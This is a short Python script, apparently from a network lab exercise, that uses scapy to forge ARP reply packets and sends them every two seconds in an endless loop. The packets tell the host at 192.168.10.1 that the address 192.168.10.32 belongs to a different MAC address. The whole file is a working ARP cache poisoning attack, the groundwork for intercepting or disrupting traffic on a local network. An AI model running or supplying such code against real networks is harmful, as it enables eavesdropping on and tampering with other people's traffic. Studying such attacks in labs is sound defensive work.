#!/usr/bin/env python3
import time
from scapy.all import *
arp_reply = (Ether(dst="ca:01:0a:4c:00:00") / ARP(op=2, psrc="192.168.10.32", 
             hwsrc="00:0c:29:69:a3:9a", pdst="192.168.10.1", 
             hwdst="ca:01:0a:4c:00:00"))
while True:
    sendp(arp_reply, iface="eth0")
    time.sleep(2)
